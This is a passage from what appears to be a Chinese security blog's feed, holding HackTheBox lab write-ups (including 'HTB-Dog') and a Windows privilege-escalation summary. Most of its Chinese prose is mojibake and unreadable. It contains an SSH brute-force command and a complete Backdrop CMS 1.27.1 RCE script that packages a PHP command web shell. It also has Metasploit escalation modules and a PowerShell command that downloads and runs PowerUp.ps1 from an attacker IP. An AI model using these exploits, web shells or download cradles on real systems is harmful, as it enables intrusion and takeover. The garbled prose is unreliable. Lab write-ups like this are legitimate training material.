æ‰“å°ç”Ÿæˆçš„å¯†ç </span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 2024-08-30 14:40:42 UTCçš„Unixæ—¶é—´æˆ³</span><br>    base_time_sec = <span class="hljs-number">1725028842</span><br>    <span class="hljs-comment"># éå†è¯¥ç§’å†…çš„1000æ¯«ç§’</span><br>    <span class="hljs-keyword">for</span> ms <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>        seed = base_time_sec * <span class="hljs-number">1000</span> + ms  <span class="hljs-comment"># ç”Ÿæˆç§å­ï¼ŒåŒ…å«æ¯«ç§’éƒ¨åˆ†</span><br>        generate_password(seed)  <span class="hljs-comment"># ç”Ÿæˆå¹¶æ‰“å°å¯†ç </span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()  <span class="hljs-comment"># è¿è¡Œä¸»å‡½æ•°</span><br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hydra</span> -l neo -P password.txt ssh://<span class="hljs-number">10.10.11.63</span> -t <span class="hljs-number">4</span> -vV<br></code></pre></td></tr></table></figure><h2 id="rootææƒ"><a href="#rootææƒ" class="headerlink" title="rootææƒ"></a>rootææƒ</h2><p>çˆ†ç ´å‡ºæ¥å¯†ç ä¹‹åï¼Œsudo -l å‘ç°èƒ½ç›´æ¥root</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504080020571.png" alt="image-20250408002017440"></p>]]></content>
    
    
    <categories>
      
      <category>Linuxå›°éš¾é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Dog</title>
    <link href="/2025/03/17/HTB-Dog/"/>
    <url>/2025/03/17/HTB-Dog/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-Dog"><a href="#HTB-Dog" class="headerlink" title="HTB-Dog"></a>HTB-Dog</h1><h2 id="gitæ³„éœ²"><a href="#gitæ³„éœ²" class="headerlink" title="gitæ³„éœ²"></a>gitæ³„éœ²</h2><p>åˆ©ç”¨rustscanè¿›è¡Œæ‰«æ 22å’Œ80ç«¯å£å¼€æ”¾ã€‚</p><p>è®¿é—®80ç«¯å£å‘ç°æ˜¯ä¸€ä¸ª Backdrop CMSï¼Œæ‰«ä¸€ä¸‹åå°ï¼Œå‘ç°æ˜¯ä¸€ä¸ªgitæ³„éœ²ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100842662.png" alt="image-20250310084232235"></p><p>åˆ©ç”¨Githackè¿›è¡Œä¸€æ³¢æ‰«æï¼Œåœ¨settings.phpä¸­å‘ç°mysqlçš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100844463.png" alt="image-20250310084405239"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">mysql:</span>//root:BackDropJ2024DS2024<span class="hljs-subst">@127</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/backdrop<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¿¡æ¯æ”¶é›†ï¼Œèƒ½å‘ç°å®ƒæ˜¯ä¸€ä¸ª1.27.1ç‰ˆæœ¬çš„ã€‚</p><h2 id="1-27-1ç‰ˆæœ¬RCE"><a href="#1-27-1ç‰ˆæœ¬RCE" class="headerlink" title="1.27.1ç‰ˆæœ¬RCE"></a>1.27.1ç‰ˆæœ¬RCE</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100925692.png" alt="image-20250310092517504"></p><p>åœ¨exploitä¸­ï¼Œèƒ½æ‰¾åˆ°ä¸€ä¸ªRCEçš„åˆ©ç”¨ï¼Œä½†æ˜¯å¾—å…ˆç™»å½•è¿›å»æ‰èƒ½è¿›è¡Œåˆ©ç”¨ã€‚</p><p><a href="https://www.exploit-db.com/exploits/52021">https://www.exploit-db.com/exploits/52021</a></p><p><a href="https://github.com/FisMatHack/BackDropScan">https://github.com/FisMatHack/BackDropScan</a> githubä¸Šæ‰¾åˆ°ä¸€ä¸ªçˆ†ç ´ç”¨æˆ·åçš„è„šæœ¬</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 BackDropScan.py --url http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.58</span> --userslist <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>seclists<span class="hljs-regexp">/Usernames/</span>xato-net-<span class="hljs-number">10</span>-million-usernames.txt --userenum<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503101910068.png" alt="image-20250310191024834"></p><p>å¯†ç å°±æ˜¯ä¸Šé¢æ‰¾åˆ°çš„mysqlçš„å¯†ç </p><p>è¿™é‡Œçš„è¯å®ƒzipä¸èƒ½ä¸Šä¼ ï¼Œæ ¹æ®è¦æ±‚æˆ‘ä»¬å¯ä»¥æ”¹æˆtarå½¢å¼çš„ï¼Œç„¶åä¸Šä¼ ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> tarfile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_files</span>():<br>    info_content = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    type = module</span><br><span class="hljs-string">    name = Block</span><br><span class="hljs-string">    description = Controls the visual building blocks a page is constructed</span><br><span class="hljs-string">    with. Blocks are boxes of content rendered into an area, or region, of a</span><br><span class="hljs-string">    web page.</span><br><span class="hljs-string">    package = Layouts</span><br><span class="hljs-string">    tags[] = Blocks</span><br><span class="hljs-string">    tags[] = Site Architecture</span><br><span class="hljs-string">    version = BACKDROP_VERSION</span><br><span class="hljs-string">    backdrop = 1.x</span><br><span class="hljs-string"></span><br><span class="hljs-string">    configure = admin/structure/block</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ; Added by Backdrop CMS packaging script on 2024-03-07</span><br><span class="hljs-string">    project = backdrop</span><br><span class="hljs-string">    version = 1.27.1</span><br><span class="hljs-string">    timestamp = 1709862662</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    shell_info_path = <span class="hljs-string">&quot;shell/shell.info&quot;</span><br>    os.makedirs(os.path.dirname(shell_info_path), exist_ok=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(shell_info_path, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(info_content)<br><br>    shell_content = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;html&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">    &lt;form method=&quot;GET&quot; name=&quot;&lt;?php echo basename($_SERVER[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; autofocus id=&quot;cmd&quot; size=&quot;80&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;</span><br><span class="hljs-string">    &lt;/form&gt;</span><br><span class="hljs-string">    &lt;pre&gt;</span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string">    if(isset($_GET[&#x27;cmd&#x27;]))</span><br><span class="hljs-string">    &#123;</span><br><span class="hljs-string">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    ?&gt;</span><br><span class="hljs-string">    &lt;/pre&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">    &lt;/html&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    shell_php_path = <span class="hljs-string">&quot;shell/shell.php&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(shell_php_path, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(shell_content)<br>    <span class="hljs-keyword">return</span> shell_info_path, shell_php_path<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_tar</span>(<span class="hljs-params">info_path, php_path</span>):<br>    tar_filename = <span class="hljs-string">&quot;shell.tar&quot;</span><br>    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(tar_filename, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>        tar.add(info_path, arcname=<span class="hljs-string">&#x27;shell/shell.info&#x27;</span>)<br>        tar.add(php_path, arcname=<span class="hljs-string">&#x27;shell/shell.php&#x27;</span>)<br>    <span class="hljs-keyword">return</span> tar_filename<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Backdrop CMS 1.27.1 - Remote Command Execution Exploit&quot;</span>)<br>    time.sleep(<span class="hljs-number">3</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Evil module generating...&quot;</span>)<br>    time.sleep(<span class="hljs-number">2</span>)<br><br>    info_path, php_path = create_files()<br>    tar_filename = create_tar(info_path, php_path)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Evil module generated!&quot;</span>, tar_filename)<br>    time.sleep(<span class="hljs-number">2</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Go to &quot;</span> + url + <span class="hljs-string">&quot;/admin/modules/install and upload the &quot;</span> +<br>          tar_filename + <span class="hljs-string">&quot; for Manual Installation.&quot;</span>)<br>    time.sleep(<span class="hljs-number">2</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your shell address:&quot;</span>, url + <span class="hljs-string">&quot;/modules/shell/shell.php&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">import</span> sys<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [url]&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        main(sys.argv[<span class="hljs-number">1</span>])<br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102150191.png" alt="image-20250310215054986"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102202261.png" alt="image-20250310220202141"></p><p>åœ¨homeç›®å½•ä¸‹å‘ç°ä¸¤ä¸ªç”¨æˆ·ï¼Œå…¶ä¸­åœ¨johncusackç”¨æˆ·ä¸‹å‘ç°user.txt æ²¡æƒé™æŸ¥çœ‹ï¼Œçœ‹æ¥å¾—è½¬æ¢ç”¨æˆ·ï¼ŒçŒœç€è¿™é‡Œæ˜¯sshç™»å½•çš„ï¼Œä¹‹å‰çš„æ•°æ®åº“å¯†ç ä¹Ÿæ˜¯sshç™»å½•å¯†ç ï¼Œå‘ç°æ˜¯å¯ä»¥çš„ã€‚</p><h2 id="beeææƒ"><a href="#beeææƒ" class="headerlink" title="beeææƒ"></a>beeææƒ</h2><p>ææƒçš„è¯åˆ©ç”¨beeè¿›è¡Œææƒã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102209437.png" alt="image-20250310220947262"></p><p>çœ‹ä¸€ä¸‹beeçš„ç”¨æ³•ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Usage</span>: bee [<span class="hljs-keyword">global</span>-<span class="hljs-keyword">options</span>] &lt;command&gt; [<span class="hljs-keyword">options</span>] [arguments]<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªcommandä¸­æœ‰ä¸€ä¸ªeval èƒ½æ‰§è¡Œphpä»£ç ã€‚</p><p>ç„¶åè¿™é‡Œçš„-optionsç”¨â€“rootæŒ‡å®šä¸€ä¸‹ç½‘ç«™æ ¹ç›®å½•ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102228040.png" alt="image-20250310222814907"></p>]]></content>
    
    
    <categories>
      
      <category>Linuxé¶æœºåˆçº§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windowsææƒ_2</title>
    <link href="/2025/03/04/%E5%86%8D%E8%B0%88windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/"/>
    <url>/2025/03/04/%E5%86%8D%E8%B0%88windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="windowsææƒ-2"><a href="#windowsææƒ-2" class="headerlink" title="windowsææƒ_2"></a>windowsææƒ_2</h1><p>å¯¹windowsçš„ä¸€äº›å¸¸è§çš„ææƒæ‰‹æ³•è¿›è¡Œä¸€ä¸ªæ€»ç»“</p><h2 id="windows-ç³»ç»Ÿå†…æ ¸ææƒæ¼æ´"><a href="#windows-ç³»ç»Ÿå†…æ ¸ææƒæ¼æ´" class="headerlink" title="windows ç³»ç»Ÿå†…æ ¸ææƒæ¼æ´"></a>windows ç³»ç»Ÿå†…æ ¸ææƒæ¼æ´</h2><p>ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œé€šè¿‡ä¿®æ”¹å†…å­˜ä¸­å˜é‡çš„å€¼ï¼Œå¯ä»¥åŠ«æŒè¿›ç¨‹ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼Œæœ€ç»ˆè·å–åˆ°ç³»ç»Ÿæƒé™ã€‚</p><p>é€šè¿‡æŸ¥çœ‹ç³»ç»Ÿè¡¥ä¸ï¼Œçœ‹å½“å‰ç³»ç»Ÿå“ªäº›æ²¡æœ‰è¿›è¡Œæ‰“è¡¥ä¸ï¼Œå°±å»å¯»æ‰¾ç›¸å…³çš„æ¼æ´ã€‚</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits#%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8">windowsä¸åŒç³»ç»Ÿæå–çš„æ¼æ´å’Œè¡¥ä¸çš„ç›¸å…³ä¿¡æ¯</a></p><p>1.æ‰‹åŠ¨å¯»æ‰¾è¡¥ä¸ä¿¡æ¯ï¼š</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>info<br>wmic qfe get <span class="hljs-keyword">caption</span>,description,hotfixid,installedon<br></code></pre></td></tr></table></figure><p>2.è‡ªåŠ¨æŸ¥æ‰¾ç³»ç»Ÿæ½œåœ¨çš„æ¼æ´ã€‚</p><p>2.1 <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows Exploit Suggester</a></p><p>2.2 åˆ©ç”¨msfä¸­çš„ç›¸å…³æ¨¡å— </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">//åˆ—å‡ºå¯èƒ½æœ¬åœ°ææƒçš„exploit</span><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/recon/local_exploit_suggester <br><span class="hljs-keyword">set</span> session 1  / å½“æˆ‘ä»¬è·å–åˆ°ä¸€ä¸ª<span class="hljs-keyword">shell</span>ä¹‹åè®¾ç½®çš„<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503111925536.png" alt="image-20250311192517366"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503112002057.png" alt="image-20250311200222979"></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">//é€šè¿‡æœ¬æ¨¡å—è·å–ç¼ºå°‘çš„è¡¥ä¸ä¿¡æ¯</span><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/windows/gather/enum_patches<br><span class="hljs-keyword">set</span> session 1  / å½“æˆ‘ä»¬è·å–åˆ°ä¸€ä¸ª<span class="hljs-keyword">shell</span>ä¹‹åè®¾ç½®çš„<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p>ç›¸å…³çš„ææƒå·¥å…·ï¼š<a href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></p><h2 id="é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒ"><a href="#é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒ" class="headerlink" title="é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒ"></a>é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒ</h2><p>1.æœªæ­£ç¡®è§£ææœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ‰€å¼•å‘çš„æ¼æ´ã€‚</p><p>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;C:\Program Files\Some Folder\Service.exe&quot;</span><br></code></pre></td></tr></table></figure><p>å¯¹äºè·¯å¾„å‰é¢çš„ç©ºæ ¼ï¼Œwindowsä¼šå»å¯»æ‰¾ä¸å…¶ç›¸å…³çš„exeæ–‡ä»¶ï¼Œå¦‚æœåŒ¹é…åˆ°äº†å°±è¿›è¡Œæ‰§è¡Œï¼Œæ²¡åŒ¹é…åˆ°å°±æ¥ç€åŒ¹é…ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­windowsä¼šå…ˆå¯»æ‰¾C:\Program.exe ç„¶åæ˜¯C:\Program Files\Some.exe æœ€åæ‰æ˜¯C:\Program Files\Some Folder\Service.exeï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„çš„exeæ–‡ä»¶ï¼Œç„¶åå°†å…¶æ”¾åˆ°ç‰¹å®šçš„ç›®å½•ä¸‹(éœ€è¦åˆ¤æ–­ç›®å½•æ˜¯å¦æœ‰å¯å†™å…¥çš„æƒé™ï¼Œåˆ©ç”¨icacls)ï¼Œå½“ç³»ç»ŸåŒ¹é…åˆ°çš„æ—¶å€™ï¼Œä¼šä»¥systemæƒé™æ¥è¿è¡Œè¿™ä¸ªexeæ–‡ä»¶ã€‚</p><p>ç„¶åé‡å¯è¿™ä¸ªæœåŠ¡ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> stop <span class="hljs-string">&quot;æœåŠ¡&quot;</span><br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> <span class="hljs-string">&quot;æœåŠ¡&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode|findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr/i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;    //åˆ—å‡ºå½“å‰ä¸»æœºå…·æœ‰ç©ºæ ¼å¹¶ä¸”æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„</span><br></code></pre></td></tr></table></figure><p>å†msfä¸­ä¹Ÿæœ‰ç›¸å¯¹åº”çš„æ¨¡å—ï¼š</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/unquoted_service_path<br><span class="hljs-keyword">set</span> session 1<br><span class="hljs-keyword">set</span> AutoRunScript migrate -f  <span class="hljs-comment">//è¿›è¡Œè¿›ç¨‹è¿ç§»çš„ å½“ä¸€ä¸ªè¿›ç¨‹å†windowsä¸­å¯åŠ¨æ—¶ï¼Œå°±ä¼šä¸æœåŠ¡æ§åˆ¶ç®¡ç†è¿›è¡Œä¸€ä¸ªé€šä¿¡ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé€šä¿¡ï¼ŒæœåŠ¡æ§åˆ¶ç®¡ç†å°±ä¼šè®¤ä¸ºå®ƒæ˜¯å‡ºé”™çš„ï¼Œè¿›è¡Œå…³é—­è¿™ä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œè¿›ç¨‹è¿ç§»</span><br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p>2.ç³»ç»Ÿæƒé™é…ç½®é”™è¯¯æ¼æ´</p><p>ä½æƒé™ç”¨æˆ·ï¼Œå¯¹ç³»ç»ŸæœåŠ¡è°ƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶å…·æœ‰å†™çš„æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°†å…¶å˜æˆæˆ‘ä»¬è‡ªå·±æ„é€ çš„ã€‚</p><p>è¯¥æ¼æ´æœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š</p><p>1.è¯¥æœåŠ¡æœªå¯åŠ¨ï¼Œå°†è‡ªå·±æ‰€æ„é€ çš„ä¸€ä¸ªæ¶æ„æœåŠ¡æ‰€ä»£æ›¿ã€‚</p><p>2.æœåŠ¡æ­£åœ¨è¿è¡Œä¸”æ— æ³•ä¸­æ­¢ï¼Œåˆ©ç”¨DLLåŠ«æŒï¼Œå°è¯•é‡å¯æœåŠ¡ã€‚</p><p>è¿™é‡Œåˆ©ç”¨ <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a> é‡Œé¢çš„AllChecksæ¨¡å—èƒ½è‡ªåŠ¨æ£€æµ‹æœåŠ¡æ¼æ´ï¼Œé€šè¿‡æ›¿æ¢å¯æ‰§è¡Œæ–‡ä»¶æ¥å®ç°æƒé™çš„æå‡ã€‚</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">powershell -<span class="hljs-built_in">exec</span> bypass -c <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;</span>http:<span class="hljs-comment">//192.168.29.157:8081/PowerUp.ps1&#x27;);Invoke-ALLChecks&quot;</span><br></code></pre></td></tr></table></figure><p>å…·ä½“çš„å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/network/247980.html">https://www.freebuf.com/articles/network/247980.html</a></p><p>å†msfä¸­ç›¸åº”çš„æ¨¡å—ï¼š</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/service_permissions<br><span class="hljs-keyword">set</span> session 1<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><h2 id="è®¡åˆ’ä»»åŠ¡ä¸AccessChkä½¿ç”¨"><a href="#è®¡åˆ’ä»»åŠ¡ä¸AccessChkä½¿ç”¨" class="headerlink" title="è®¡åˆ’ä»»åŠ¡ä¸AccessChkä½¿ç”¨"></a>è®¡åˆ’ä»»åŠ¡ä¸AccessChkä½¿ç”¨</h2><p>å¦‚æœé«˜æƒé™è¿è¡Œçš„è®¡åˆ’ä»»åŠ¡æ‰€åœ¨çš„ç›®å½•èƒ½è¢«æ™®é€šç”¨æˆ·å†™å…¥ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿè¿›è¡Œä¸€ä¸ªåˆ©ç”¨ï¼Œå°†ç”Ÿæˆçš„æ¶æ„æ–‡ä»¶ä»£æ›¿åŸæ¥çš„æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo list /v &gt; 1.txt å°†å®šæ—¶ä»»åŠ¡çš„è¾“å‡ºç»“æœå†™å…¥åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ä¸­<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨å¾®è½¯çš„ä¸€ä¸ªå·¥å…·è¿›è¡Œæ£€æŸ¥æƒé™ï¼ˆAccessChkï¼‰è¿™ä¸ªé€šå¸¸ä¸ä¼šè¢«æ€æ¯’è½¯ä»¶ç»™æ£€æµ‹åˆ°ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">æŸ¥çœ‹æŒ‡å®šç›®å½•ä¸‹çš„æƒé™ <br>accesschk.<span class="hljs-keyword">exe</span> -dqv <span class="hljs-string">&quot;xxxxxxx&quot;</span> -accepteula   //accepteulaæ˜¯ç¬¬ä¸€æ¬¡æ‰€ä½¿ç”¨æ—¶æ¥å—ç›¸å…³çš„åè®®ã€‚<br>æ‰¾å‡ºæŸä¸ªé©±åŠ¨ä¸‹æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶å¤¹ï¼š<br>accesschk.<span class="hljs-keyword">exe</span> -uwdqs Users <span class="hljs-keyword">c</span>:\ <br>accesschk.<span class="hljs-keyword">exe</span> -uwdqs <span class="hljs-string">&quot;Authenticated Users&quot;</span> <span class="hljs-keyword">c</span>:\    //Authenticated Users å¯¹è¿™äº›æœåŠ¡çš„æƒé™<br><br>æ‰¾å‡ºæŸä¸ªé©±åŠ¨ä¸‹æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶ï¼š<br>accesschk.<span class="hljs-keyword">exe</span> -uwqs Users <span class="hljs-keyword">c</span>:\*.*  <br>accesschk.<span class="hljs-keyword">exe</span> -uwqs <span class="hljs-string">&quot;Authenticated Users&quot;</span> <span class="hljs-keyword">c</span>:\*.*<br><br></code></pre></td></tr></table></figure><h2 id="æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯æ³„éœ²ï¼š"><a href="#æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯æ³„éœ²ï¼š" class="headerlink" 